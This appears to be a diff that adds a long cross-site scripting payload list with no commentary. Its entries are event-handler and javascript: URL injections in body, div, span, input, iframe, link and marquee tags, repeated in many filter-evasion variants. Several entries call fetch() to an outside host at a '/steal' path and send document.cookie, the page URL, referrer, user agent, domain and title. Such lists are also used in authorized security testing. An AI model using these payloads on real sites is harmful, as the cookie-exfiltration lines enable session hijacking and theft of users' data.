+<body onload=document.write('XSS')>
+<body onload=document.write("XSS")>
+<body onload=eval('alert(1)')>
+<body onload=eval('alert(document.cookie)')>
+<body onload=eval('alert(\"XSS\")')>
+<body onload=setTimeout('alert(1)',0)>
+<body onload=setTimeout('alert(document.cookie)',0)>
+<body onload=setTimeout('alert(\"XSS\")',0)>
+<body onload=setInterval('alert(1)',0)>
+<body onload=setInterval('alert(document.cookie)',0)>
+<body onload=setInterval('alert(\"XSS\")',0)>
+<body onload=Function('alert(1)')()>
+<body onload=Function('alert(document.cookie)')()>
+<body onload=Function('alert(\"XSS\")')()>
+<body onload=(alert)(1)>
+<body onload=(alert)(document.cookie)>
+<body onload=(alert)('XSS')>
+<body onload=alert.call(null,1)>
+<body onload=alert.call(null,document.cookie)>
+<body onload=alert.call(null,'XSS')>
+<body onload=alert.apply(null,[1])>
+<body onload=alert.apply(null,[document.cookie])>
+<body onload=alert.apply(null,['XSS'])>
+<body onload=window['alert'](1)>
+<body onload=window['alert'](document.cookie)>
+<body onload=window['alert']('XSS')>
+<body onload=self['alert'](1)>
+<body onload=self['alert'](document.cookie)>
+<body onload=self['alert']('XSS')>
+<body onload=top['alert'](1)>
+<body onload=top['alert'](document.cookie)>
+<body onload=top['alert']('XSS')>
+<body onload=parent['alert'](1)>
+<body onload=parent['alert'](document.cookie)>
+<body onload=parent['alert']('XSS')>
+<body onload=opener['alert'](1)>
+<body onload=opener['alert'](document.cookie)>
+<body onload=opener['alert']('XSS')>
+<body onload=frames['alert'](1)>
+<body onload=frames['alert'](document.cookie)>
+<body onload=frames['alert']('XSS')>
+<body onload=globalThis['alert'](1)>
+<body onload=globalThis['alert'](document.cookie)>
+<body onload=globalThis['alert']('XSS')>
+<body onload=alert`1`>
+<body onload=alert``>
+<body onload=alert(1)>
+<body onload=alert(1);>
+<body onload=alert(1)//>
+<body onload=alert(1)/*>
+<body onload=alert(1)<!-->
+<body onload=alert(1)--> >
+<body onload=alert(1);alert(2)>
+<body onload=alert(1);alert(2);alert(3)>
+<body onload=alert(1);alert(2);alert(3);alert(4)>
+<body onload=alert(1);alert(2);alert(3);alert(4);alert(5)>
+<div onmouseover=alert(1)>Hover</div>
+<div onmouseover=alert(document.cookie)>Hover</div>
+<div onmouseover=alert('XSS')>Hover</div>
+<div onmouseover=alert("XSS")>Hover</div>
+<div onmouseover=alert(/XSS/)>Hover</div>
+<div onmouseover=alert(1);>Hover</div>
+<div onmouseover=alert(1)//>Hover</div>
+<div onmouseover=alert(1)/*>Hover</div>
+<div onmouseover=alert(1)<!-->Hover</div>
+<div onmouseover=alert(1)--> >Hover</div>
+<div onmouseover=alert(1);alert(2)>Hover</div>
+<div onmouseover=alert(1);alert(2);alert(3)>Hover</div>
+<div onmouseover=alert(1);alert(2);alert(3);alert(4)>Hover</div>
+<div onmouseover=alert(1);alert(2);alert(3);alert(4);alert(5)>Hover</div>
+<div onmouseover=fetch('http://xss.pt/steal?c='+document.cookie)>Hover</div>
+<div onmouseover=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)>Hover</div>
+<div onmouseover=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)>Hover</div>
+<div onmouseover=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent)>Hover</div>
+<div onmouseover=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain)>Hover</div>
+<div onmouseover=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title)>Hover</div>
+<div onmouseover=console.log(1)>Hover</div>
+<div onmouseover=console.log(document.cookie)>Hover</div>
+<div onmouseover=console.log('XSS')>Hover</div>
+<div onmouseover=console.log("XSS")>Hover</div>
+<div onmouseover=prompt(1)>Hover</div>
+<div onmouseover=prompt(document.cookie)>Hover</div>
+<div onmouseover=prompt('XSS')>Hover</div>
+<div onmouseover=prompt("XSS")>Hover</div>
+<div onmouseover=confirm(1)>Hover</div>
+<div onmouseover=confirm(document.cookie)>Hover</div>
+<div onmouseover=confirm('XSS')>Hover</div>
+<div onmouseover=confirm("XSS")>Hover</div>
+<div onmouseover=document.write(1)>Hover</div>
+<div onmouseover=document.write(document.cookie)>Hover</div>
+<div onmouseover=document.write('XSS')>Hover</div>
+<div onmouseover=document.write("XSS")>Hover</div>
+<div onmouseover=eval('alert(1)')>Hover</div>
+<div onmouseover=eval('alert(document.cookie)')>Hover</div>
+<div onmouseover=eval('alert(\"XSS\")')>Hover</div>
+<div onmouseover=setTimeout('alert(1)',0)>Hover</div>
+<div onmouseover=setTimeout('alert(document.cookie)',0)>Hover</div>
+<div onmouseover=setTimeout('alert(\"XSS\")',0)>Hover</div>
+<div onmouseover=setInterval('alert(1)',0)>Hover</div>
+<div onmouseover=setInterval('alert(document.cookie)',0)>Hover</div>
+<div onmouseover=setInterval('alert(\"XSS\")',0)>Hover</div>
+<div onmouseover=Function('alert(1)')()>Hover</div>
+<div onmouseover=Function('alert(document.cookie)')()>Hover</div>
+<div onmouseover=Function('alert(\"XSS\")')()>Hover</div>
+<div onmouseover=(alert)(1)>Hover</div>
+<div onmouseover=(alert)(document.cookie)>Hover</div>
+<div onmouseover=(alert)('XSS')>Hover</div>
+<div onmouseover=alert.call(null,1)>Hover</div>
+<div onmouseover=alert.call(null,document.cookie)>Hover</div>
+<div onmouseover=alert.call(null,'XSS')>Hover</div>
+<div onmouseover=alert.apply(null,[1])>Hover</div>
+<div onmouseover=alert.apply(null,[document.cookie])>Hover</div>
+<div onmouseover=alert.apply(null,['XSS'])>Hover</div>
+<div onmouseover=window['alert'](1)>Hover</div>
+<div onmouseover=window['alert'](document.cookie)>Hover</div>
+<div onmouseover=window['alert']('XSS')>Hover</div>
+<div onmouseover=self['alert'](1)>Hover</div>
+<div onmouseover=self['alert'](document.cookie)>Hover</div>
+<div onmouseover=self['alert']('XSS')>Hover</div>
+<div onmouseover=top['alert'](1)>Hover</div>
+<div onmouseover=top['alert'](document.cookie)>Hover</div>
+<div onmouseover=top['alert']('XSS')>Hover</div>
+<div onmouseover=parent['alert'](1)>Hover</div>
+<div onmouseover=parent['alert'](document.cookie)>Hover</div>
+<div onmouseover=parent['alert']('XSS')>Hover</div>
+<div onmouseover=opener['alert'](1)>Hover</div>
+<div onmouseover=opener['alert'](document.cookie)>Hover</div>
+<div onmouseover=opener['alert']('XSS')>Hover</div>
+<div onmouseover=frames['alert'](1)>Hover</div>
+<div onmouseover=frames['alert'](document.cookie)>Hover</div>
+<div onmouseover=frames['alert']('XSS')>Hover</div>
+<div onmouseover=globalThis['alert'](1)>Hover</div>
+<div onmouseover=globalThis['alert'](document.cookie)>Hover</div>
+<div onmouseover=globalThis['alert']('XSS')>Hover</div>
+<div onmouseover=alert`1`>Hover</div>
+<div onmouseover=alert``>Hover</div>
+<div onmouseover=alert(1)>Hover</div>
+<div onmouseover=alert(1);>Hover</div>
+<div onmouseover=alert(1)//>Hover</div>
+<div onmouseover=alert(1)/*>Hover</div>
+<div onmouseover=alert(1)<!-->Hover</div>
+<div onmouseover=alert(1)--> >Hover</div>
+<div onmouseover=alert(1);alert(2)>Hover</div>
+<div onmouseover=alert(1);alert(2);alert(3)>Hover</div>
+<div onmouseover=alert(1);alert(2);alert(3);alert(4)>Hover</div>
+<div onmouseover=alert(1);alert(2);alert(3);alert(4);alert(5)>Hover</div>
+<span onmouseover=alert(1)>Hover</span>
+<span onmouseover=alert(document.cookie)>Hover</span>
+<span onmouseover=alert('XSS')>Hover</span>
+<span onmouseover=alert("XSS")>Hover</span>
+<span onmouseover=alert(/XSS/)>Hover</span>
+<span onmouseover=alert(1);>Hover</span>
+<span onmouseover=alert(1)//>Hover</span>
+<span onmouseover=alert(1)/*>Hover</span>
+<span onmouseover=alert(1)<!-->Hover</span>
+<span onmouseover=alert(1)--> >Hover</span>
+<span onmouseover=alert(1);alert(2)>Hover</span>
+<span onmouseover=alert(1);alert(2);alert(3)>Hover</span>
+<span onmouseover=alert(1);alert(2);alert(3);alert(4)>Hover</span>
+<span onmouseover=alert(1);alert(2);alert(3);alert(4);alert(5)>Hover</span>
+<span onmouseover=fetch('http://xss.pt/steal?c='+document.cookie)>Hover</span>
+<span onmouseover=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)>Hover</span>
+<span onmouseover=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)>Hover</span>
+<span onmouseover=console.log(1)>Hover</span>
+<span onmouseover=console.log(document.cookie)>Hover</span>
+<span onmouseover=console.log('XSS')>Hover</span>
+<span onmouseover=console.log("XSS")>Hover</span>
+<span onmouseover=prompt(1)>Hover</span>
+<span onmouseover=prompt(document.cookie)>Hover</span>
+<span onmouseover=prompt('XSS')>Hover</span>
+<span onmouseover=prompt("XSS")>Hover</span>
+<span onmouseover=confirm(1)>Hover</span>
+<span onmouseover=confirm(document.cookie)>Hover</span>
+<span onmouseover=confirm('XSS')>Hover</span>
+<span onmouseover=confirm("XSS")>Hover</span>
+<span onmouseover=document.write(1)>Hover</span>
+<span onmouseover=document.write(document.cookie)>Hover</span>
+<span onmouseover=document.write('XSS')>Hover</span>
+<span onmouseover=document.write("XSS")>Hover</span>
+<span onmouseover=eval('alert(1)')>Hover</span>
+<span onmouseover=eval('alert(document.cookie)')>Hover</span>
+<span onmouseover=eval('alert(\"XSS\")')>Hover</span>
+<span onmouseover=setTimeout('alert(1)',0)>Hover</span>
+<span onmouseover=setTimeout('alert(document.cookie)',0)>Hover</span>
+<span onmouseover=setTimeout('alert(\"XSS\")',0)>Hover</span>
+<span onmouseover=setInterval('alert(1)',0)>Hover</span>
+<span onmouseover=setInterval('alert(document.cookie)',0)>Hover</span>
+<span onmouseover=setInterval('alert(\"XSS\")',0)>Hover</span>
+<span onmouseover=Function('alert(1)')()>Hover</span>
+<span onmouseover=Function('alert(document.cookie)')()>Hover</span>
+<span onmouseover=Function('alert(\"XSS\")')()>Hover</span>
+<span onmouseover=(alert)(1)>Hover</span>
+<span onmouseover=(alert)(document.cookie)>Hover</span>
+<span onmouseover=(alert)('XSS')>Hover</span>
+<span onmouseover=alert.call(null,1)>Hover</span>
+<span onmouseover=alert.call(null,document.cookie)>Hover</span>
+<span onmouseover=alert.call(null,'XSS')>Hover</span>
+<span onmouseover=alert.apply(null,[1])>Hover</span>
+<span onmouseover=alert.apply(null,[document.cookie])>Hover</span>
+<span onmouseover=alert.apply(null,['XSS'])>Hover</span>
+<span onmouseover=window['alert'](1)>Hover</span>
+<span onmouseover=window['alert'](document.cookie)>Hover</span>
+<span onmouseover=window['alert']('XSS')>Hover</span>
+<span onmouseover=self['alert'](1)>Hover</span>
+<span onmouseover=self['alert'](document.cookie)>Hover</span>
+<span onmouseover=self['alert']('XSS')>Hover</span>
+<span onmouseover=top['alert'](1)>Hover</span>
+<span onmouseover=top['alert'](document.cookie)>Hover</span>
+<span onmouseover=top['alert']('XSS')>Hover</span>
+<span onmouseover=parent['alert'](1)>Hover</span>
+<span onmouseover=parent['alert'](document.cookie)>Hover</span>
+<span onmouseover=parent['alert']('XSS')>Hover</span>
+<span onmouseover=opener['alert'](1)>Hover</span>
+<span onmouseover=opener['alert'](document.cookie)>Hover</span>
+<span onmouseover=opener['alert']('XSS')>Hover</span>
+<span onmouseover=frames['alert'](1)>Hover</span>
+<span onmouseover=frames['alert'](document.cookie)>Hover</span>
+<span onmouseover=frames['alert']('XSS')>Hover</span>
+<span onmouseover=globalThis['alert'](1)>Hover</span>
+<span onmouseover=globalThis['alert'](document.cookie)>Hover</span>
+<span onmouseover=globalThis['alert']('XSS')>Hover</span>
+<span onmouseover=alert`1`>Hover</span>
+<span onmouseover=alert``>Hover</span>
+<span onmouseover=alert(1)>Hover</span>
+<span onmouseover=alert(1);>Hover</span>
+<span onmouseover=alert(1)//>Hover</span>
+<span onmouseover=alert(1)/*>Hover</span>
+<span onmouseover=alert(1)<!-->Hover</span>
+<span onmouseover=alert(1)--> >Hover</span>
+<span onmouseover=alert(1);alert(2)>Hover</span>
+<span onmouseover=alert(1);alert(2);alert(3)>Hover</span>
+<span onmouseover=alert(1);alert(2);alert(3);alert(4)>Hover</span>
+<span onmouseover=alert(1);alert(2);alert(3);alert(4);alert(5)>Hover</span>
+<input onfocus=alert(1) autofocus>
+<input onfocus=alert(document.cookie) autofocus>
+<input onfocus=alert('XSS') autofocus>
+<input onfocus=alert("XSS") autofocus>
+<input onfocus=alert(/XSS/) autofocus>
+<input onfocus=alert(1); autofocus>
+<input onfocus=alert(1)// autofocus>
+<input onfocus=alert(1)/* autofocus>
+<input onfocus=alert(1)<!-- autofocus>
+<input onfocus=alert(1)-->  autofocus>
+<input onfocus=alert(1);alert(2) autofocus>
+<input onfocus=alert(1);alert(2);alert(3) autofocus>
+<input onfocus=alert(1);alert(2);alert(3);alert(4) autofocus>
+<input onfocus=alert(1);alert(2);alert(3);alert(4);alert(5) autofocus>
+<input onfocus=fetch('http://xss.pt/steal?c='+document.cookie) autofocus>
+<input onfocus=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href) autofocus>
+<input onfocus=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer) autofocus>
+<input onfocus=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent) autofocus>
+<input onfocus=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain) autofocus>
+<input onfocus=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title) autofocus>
+<input onfocus=console.log(1) autofocus>
+<input onfocus=console.log(document.cookie) autofocus>
+<input onfocus=console.log('XSS') autofocus>
+<input onfocus=console.log("XSS") autofocus>
+<input onfocus=prompt(1) autofocus>
+<input onfocus=prompt(document.cookie) autofocus>
+<input onfocus=prompt('XSS') autofocus>
+<input onfocus=prompt("XSS") autofocus>
+<input onfocus=confirm(1) autofocus>
+<input onfocus=confirm(document.cookie) autofocus>
+<input onfocus=confirm('XSS') autofocus>
+<input onfocus=confirm("XSS") autofocus>
+<input onfocus=document.write(1) autofocus>
+<input onfocus=document.write(document.cookie) autofocus>
+<input onfocus=document.write('XSS') autofocus>
+<input onfocus=document.write("XSS") autofocus>
+<input onfocus=eval('alert(1)') autofocus>
+<input onfocus=eval('alert(document.cookie)') autofocus>
+<input onfocus=eval('alert(\"XSS\")') autofocus>
+<input onfocus=setTimeout('alert(1)',0) autofocus>
+<input onfocus=setTimeout('alert(document.cookie)',0) autofocus>
+<input onfocus=setTimeout('alert(\"XSS\")',0) autofocus>
+<input onfocus=setInterval('alert(1)',0) autofocus>
+<input onfocus=setInterval('alert(document.cookie)',0) autofocus>
+<input onfocus=setInterval('alert(\"XSS\")',0) autofocus>
+<input onfocus=Function('alert(1)')() autofocus>
+<input onfocus=Function('alert(document.cookie)')() autofocus>
+<input onfocus=Function('alert(\"XSS\")')() autofocus>
+<input onfocus=(alert)(1) autofocus>
+<input onfocus=(alert)(document.cookie) autofocus>
+<input onfocus=(alert)('XSS') autofocus>
+<input onfocus=alert.call(null,1) autofocus>
+<input onfocus=alert.call(null,document.cookie) autofocus>
+<input onfocus=alert.call(null,'XSS') autofocus>
+<input onfocus=alert.apply(null,[1]) autofocus>
+<input onfocus=alert.apply(null,[document.cookie]) autofocus>
+<input onfocus=alert.apply(null,['XSS']) autofocus>
+<input onfocus=window['alert'](1) autofocus>
+<input onfocus=window['alert'](document.cookie) autofocus>
+<input onfocus=window['alert']('XSS') autofocus>
+<input onfocus=self['alert'](1) autofocus>
+<input onfocus=self['alert'](document.cookie) autofocus>
+<input onfocus=self['alert']('XSS') autofocus>
+<input onfocus=top['alert'](1) autofocus>
+<input onfocus=top['alert'](document.cookie) autofocus>
+<input onfocus=top['alert']('XSS') autofocus>
+<input onfocus=parent['alert'](1) autofocus>
+<input onfocus=parent['alert'](document.cookie) autofocus>
+<input onfocus=parent['alert']('XSS') autofocus>
+<input onfocus=opener['alert'](1) autofocus>
+<input onfocus=opener['alert'](document.cookie) autofocus>
+<input onfocus=opener['alert']('XSS') autofocus>
+<input onfocus=frames['alert'](1) autofocus>
+<input onfocus=frames['alert'](document.cookie) autofocus>
+<input onfocus=frames['alert']('XSS') autofocus>
+<input onfocus=globalThis['alert'](1) autofocus>
+<input onfocus=globalThis['alert'](document.cookie) autofocus>
+<input onfocus=globalThis['alert']('XSS') autofocus>
+<input onfocus=alert`1` autofocus>
+<input onfocus=alert`` autofocus>
+<input onfocus=alert(1) autofocus>
+<input onfocus=alert(1); autofocus>
+<input onfocus=alert(1)// autofocus>
+<input onfocus=alert(1)/* autofocus>
+<input onfocus=alert(1)<!-- autofocus>
+<input onfocus=alert(1)-->  autofocus>
+<input onfocus=alert(1);alert(2) autofocus>
+<input onfocus=alert(1);alert(2);alert(3) autofocus>
+<input onfocus=alert(1);alert(2);alert(3);alert(4) autofocus>
+<input onfocus=alert(1);alert(2);alert(3);alert(4);alert(5) autofocus>
+<iframe src="javascript:alert(1)">
+<iframe src="javascript:alert(document.cookie)">
+<iframe src="javascript:alert('XSS')">
+<iframe src="javascript:alert("XSS")">
+<iframe src="javascript:alert(/XSS/)">
+<iframe src="javascript:alert(1);">
+<iframe src="javascript:alert(1)//">
+<iframe src="javascript:alert(1)/*">
+<iframe src="javascript:alert(1)<!--">
+<iframe src="javascript:alert(1)--> ">
+<iframe src="javascript:alert(1);alert(2)">
+<iframe src="javascript:alert(1);alert(2);alert(3)">
+<iframe src="javascript:alert(1);alert(2);alert(3);alert(4)">
+<iframe src="javascript:alert(1);alert(2);alert(3);alert(4);alert(5)">
+<iframe src="javascript:fetch('http://xss.pt/steal?c='+document.cookie)">
+<iframe src="javascript:fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)">
+<iframe src="javascript:fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)">
+<iframe src="javascript:console.log(1)">
+<iframe src="javascript:console.log(document.cookie)">
+<iframe src="javascript:console.log('XSS')">
+<iframe src="javascript:prompt(1)">
+<iframe src="javascript:prompt(document.cookie)">
+<iframe src="javascript:prompt('XSS')">
+<iframe src="javascript:confirm(1)">
+<iframe src="javascript:confirm(document.cookie)">
+<iframe src="javascript:confirm('XSS')">
+<iframe src="javascript:document.write(1)">
+<iframe src="javascript:document.write(document.cookie)">
+<iframe src="javascript:document.write('XSS')">
+<iframe src="javascript:eval('alert(1)')">
+<iframe src="javascript:eval('alert(document.cookie)')">
+<iframe src="javascript:eval('alert(\"XSS\")')">
+<iframe src="javascript:setTimeout('alert(1)',0)">
+<iframe src="javascript:setTimeout('alert(document.cookie)',0)">
+<iframe src="javascript:setTimeout('alert(\"XSS\")',0)">
+<iframe src="javascript:setInterval('alert(1)',0)">
+<iframe src="javascript:setInterval('alert(document.cookie)',0)">
+<iframe src="javascript:setInterval('alert(\"XSS\")',0)">
+<iframe src="javascript:Function('alert(1)')()">
+<iframe src="javascript:Function('alert(document.cookie)')()">
+<iframe src="javascript:Function('alert(\"XSS\")')()">
+<iframe src="javascript:(alert)(1)">
+<iframe src="javascript:(alert)(document.cookie)">
+<iframe src="javascript:(alert)('XSS')">
+<iframe src="javascript:alert.call(null,1)">
+<iframe src="javascript:alert.call(null,document.cookie)">
+<iframe src="javascript:alert.call(null,'XSS')">
+<iframe src="javascript:alert.apply(null,[1])">
+<iframe src="javascript:alert.apply(null,[document.cookie])">
+<iframe src="javascript:alert.apply(null,['XSS'])">
+<iframe src="javascript:window['alert'](1)">
+<iframe src="javascript:window['alert'](document.cookie)">
+<iframe src="javascript:window['alert']('XSS')">
+<iframe src="javascript:self['alert'](1)">
+<iframe src="javascript:self['alert'](document.cookie)">
+<iframe src="javascript:self['alert']('XSS')">
+<iframe src="javascript:top['alert'](1)">
+<iframe src="javascript:top['alert'](document.cookie)">
+<iframe src="javascript:top['alert']('XSS')">
+<iframe src="javascript:parent['alert'](1)">
+<iframe src="javascript:parent['alert'](document.cookie)">
+<iframe src="javascript:parent['alert']('XSS')">
+<iframe src="javascript:opener['alert'](1)">
+<iframe src="javascript:opener['alert'](document.cookie)">
+<iframe src="javascript:opener['alert']('XSS')">
+<iframe src="javascript:frames['alert'](1)">
+<iframe src="javascript:frames['alert'](document.cookie)">
+<iframe src="javascript:frames['alert']('XSS')">
+<iframe src="javascript:globalThis['alert'](1)">
+<iframe src="javascript:globalThis['alert'](document.cookie)">
+<iframe src="javascript:globalThis['alert']('XSS')">
+<iframe src="javascript:alert`1`">
+<iframe src="javascript:alert``">
+<iframe src="javascript:alert(1)">
+<iframe src="javascript:alert(1);">
+<iframe src="javascript:alert(1)//">
+<iframe src="javascript:alert(1)/*">
+<iframe src="javascript:alert(1)<!--">
+<iframe src="javascript:alert(1)--> ">
+<iframe src="javascript:alert(1);alert(2)">
+<iframe src="javascript:alert(1);alert(2);alert(3)">
+<iframe src="javascript:alert(1);alert(2);alert(3);alert(4)">
+<iframe src="javascript:alert(1);alert(2);alert(3);alert(4);alert(5)">
+<a href="javascript:alert(1)">Click</a>
+<a href="javascript:alert(document.cookie)">Click</a>
+<a href="javascript:alert('XSS')">Click</a>
+<a href="javascript:alert("XSS")">Click</a>
+<a href="javascript:alert(/XSS/)">Click</a>
+<a href="javascript:alert(1);">Click</a>
+<a href="javascript:alert(1)//">Click</a>
+<a href="javascript:alert(1)/*">Click</a>
+<a href="javascript:alert(1)<!--">Click</a>
+<a href="javascript:alert(1)--> ">Click</a>
+<a href="javascript:alert(1);alert(2)">Click</a>
+<a href="javascript:alert(1);alert(2);alert(3)">Click</a>
+<a href="javascript:alert(1);alert(2);alert(3);alert(4)">Click</a>
+<a href="javascript:alert(1);alert(2);alert(3);alert(4);alert(5)">Click</a>
+<a href="javascript:fetch('http://xss.pt/steal?c='+document.cookie)">Click</a>
+<a href="javascript:fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)">Click</a>
+<a href="javascript:fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)">Click</a>
+<a href="javascript:console.log(1)">Click</a>
+<a href="javascript:console.log(document.cookie)">Click</a>
+<a href="javascript:console.log('XSS')">Click</a>
+<a href="javascript:prompt(1)">Click</a>
+<a href="javascript:prompt(document.cookie)">Click</a>
+<a href="javascript:prompt('XSS')">Click</a>
+<a href="javascript:confirm(1)">Click</a>
+<a href="javascript:confirm(document.cookie)">Click</a>
+<a href="javascript:confirm('XSS')">Click</a>
+<a href="javascript:document.write(1)">Click</a>
+<a href="javascript:document.write(document.cookie)">Click</a>
+<a href="javascript:document.write('XSS')">Click</a>
+<a href="javascript:eval('alert(1)')">Click</a>
+<a href="javascript:eval('alert(document.cookie)')">Click</a>
+<a href="javascript:eval('alert(\"XSS\")')">Click</a>
+<a href="javascript:setTimeout('alert(1)',0)">Click</a>
+<a href="javascript:setTimeout('alert(document.cookie)',0)">Click</a>
+<a href="javascript:setTimeout('alert(\"XSS\")',0)">Click</a>
+<a href="javascript:setInterval('alert(1)',0)">Click</a>
+<a href="javascript:setInterval('alert(document.cookie)',0)">Click</a>
+<a href="javascript:setInterval('alert(\"XSS\")',0)">Click</a>
+<a href="javascript:Function('alert(1)')()">Click</a>
+<a href="javascript:Function('alert(document.cookie)')()">Click</a>
+<a href="javascript:Function('alert(\"XSS\")')()">Click</a>
+<a href="javascript:(alert)(1)">Click</a>
+<a href="javascript:(alert)(document.cookie)">Click</a>
+<a href="javascript:(alert)('XSS')">Click</a>
+<a href="javascript:alert.call(null,1)">Click</a>
+<a href="javascript:alert.call(null,document.cookie)">Click</a>
+<a href="javascript:alert.call(null,'XSS')">Click</a>
+<a href="javascript:alert.apply(null,[1])">Click</a>
+<a href="javascript:alert.apply(null,[document.cookie])">Click</a>
+<a href="javascript:alert.apply(null,['XSS'])">Click</a>
+<a href="javascript:window['alert'](1)">Click</a>
+<a href="javascript:window['alert'](document.cookie)">Click</a>
+<a href="javascript:window['alert']('XSS')">Click</a>
+<a href="javascript:self['alert'](1)">Click</a>
+<a href="javascript:self['alert'](document.cookie)">Click</a>
+<a href="javascript:self['alert']('XSS')">Click</a>
+<a href="javascript:top['alert'](1)">Click</a>
+<a href="javascript:top['alert'](document.cookie)">Click</a>
+<a href="javascript:top['alert']('XSS')">Click</a>
+<a href="javascript:parent['alert'](1)">Click</a>
+<a href="javascript:parent['alert'](document.cookie)">Click</a>
+<a href="javascript:parent['alert']('XSS')">Click</a>
+<a href="javascript:opener['alert'](1)">Click</a>
+<a href="javascript:opener['alert'](document.cookie)">Click</a>
+<a href="javascript:opener['alert']('XSS')">Click</a>
+<a href="javascript:frames['alert'](1)">Click</a>
+<a href="javascript:frames['alert'](document.cookie)">Click</a>
+<a href="javascript:frames['alert']('XSS')">Click</a>
+<a href="javascript:globalThis['alert'](1)">Click</a>
+<a href="javascript:globalThis['alert'](document.cookie)">Click</a>
+<a href="javascript:globalThis['alert']('XSS')">Click</a>
+<a href="javascript:alert`1`">Click</a>
+<a href="javascript:alert``">Click</a>
+<a href="javascript:alert(1)">Click</a>
+<a href="javascript:alert(1);">Click</a>
+<a href="javascript:alert(1)//">Click</a>
+<a href="javascript:alert(1)/*">Click</a>
+<a href="javascript:alert(1)<!--">Click</a>
+<a href="javascript:alert(1)--> ">Click</a>
+<a href="javascript:alert(1);alert(2)">Click</a>
+<a href="javascript:alert(1);alert(2);alert(3)">Click</a>
+<a href="javascript:alert(1);alert(2);alert(3);alert(4)">Click</a>
+<a href="javascript:alert(1);alert(2);alert(3);alert(4);alert(5)">Click</a>
+<marquee/onstart=alert(1)>
+<marquee/onstart=alert(document.cookie)>
+<marquee/onstart=alert('XSS')>
+<marquee/onstart=alert("XSS")>
+<marquee/onstart=alert(/XSS/)>
+<marquee/onstart=alert(1);>
+<marquee/onstart=alert(1)//>
+<marquee/onstart=alert(1)/*>
+<marquee/onstart=alert(1)<!-->
+<marquee/onstart=alert(1)--> >
+<marquee/onstart=alert(1);alert(2)>
+<marquee/onstart=alert(1);alert(2);alert(3)>
+<marquee/onstart=alert(1);alert(2);alert(3);alert(4)>
+<marquee/onstart=alert(1);alert(2);alert(3);alert(4);alert(5)>
+<marquee/onstart=fetch('http://xss.pt/steal?c='+document.cookie)>
+<marquee/onstart=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)>
+<marquee/onstart=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)>
+<marquee/onstart=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent)>
+<marquee/onstart=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain)>
+<marquee/onstart=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title)>
+<marquee/onstart=console.log(1)>
+<marquee/onstart=console.log(document.cookie)>
+<marquee/onstart=console.log('XSS')>
+<marquee/onstart=console.log("XSS")>
+<marquee/onstart=prompt(1)>
+<marquee/onstart=prompt(document.cookie)>
+<marquee/onstart=prompt('XSS')>
+<marquee/onstart=prompt("XSS")>
+<marquee/onstart=confirm(1)>
+<marquee/onstart=confirm(document.cookie)>
+<marquee/onstart=confirm('XSS')>
+<marquee/onstart=confirm("XSS")>
+<marquee/onstart=document.write(1)>
+<marquee/onstart=document.write(document.cookie)>
+<marquee/onstart=document.write('XSS')>
+<marquee/onstart=document.write("XSS")>
+<marquee/onstart=eval('alert(1)')>
+<marquee/onstart=eval('alert(document.cookie)')>
+<marquee/onstart=eval('alert(\"XSS\")')>
+<marquee/onstart=setTimeout('alert(1)',0)>
+<marquee/onstart=setTimeout('alert(document.cookie)',0)>
+<marquee/onstart=setTimeout('alert(\"XSS\")',0)>
+<marquee/onstart=setInterval('alert(1)',0)>
+<marquee/onstart=setInterval('alert(document.cookie)',0)>
+<marquee/onstart=setInterval('alert(\"XSS\")',0)>
+<marquee/onstart=Function('alert(1)')()>
+<marquee/onstart=Function('alert(document.cookie)')()>
+<marquee/onstart=Function('alert(\"XSS\")')()>
+<marquee/onstart=(alert)(1)>
+<marquee/onstart=(alert)(document.cookie)>
+<marquee/onstart=(alert)('XSS')>
+<marquee/onstart=alert.call(null,1)>
+<marquee/onstart=alert.call(null,document.cookie)>
+<marquee/onstart=alert.call(null,'XSS')>
+<marquee/onstart=alert.apply(null,[1])>
+<marquee/onstart=alert.apply(null,[document.cookie])>
+<marquee/onstart=alert.apply(null,['XSS'])>
+<marquee/onstart=window['alert'](1)>
+<marquee/onstart=window['alert'](document.cookie)>
+<marquee/onstart=window['alert']('XSS')>
+<marquee/onstart=self['alert'](1)>
+<marquee/onstart=self['alert'](document.cookie)>
+<marquee/onstart=self['alert']('XSS')>
+<marquee/onstart=top['alert'](1)>
+<marquee/onstart=top['alert'](document.cookie)>
+<marquee/onstart=top['alert']('XSS')>
+<marquee/onstart=parent['alert'](1)>
+<marquee/onstart=parent['alert'](document.cookie)>
+<marquee/onstart=parent['alert']('XSS')>
+<marquee/onstart=opener['alert'](1)>
+<marquee/onstart=opener['alert'](document.cookie)>
+<marquee/onstart=opener['alert']('XSS')>
+<marquee/onstart=frames['alert'](1)>
+<marquee/onstart=frames['alert'](document.cookie)>
+<marquee/onstart=frames['alert']('XSS')>
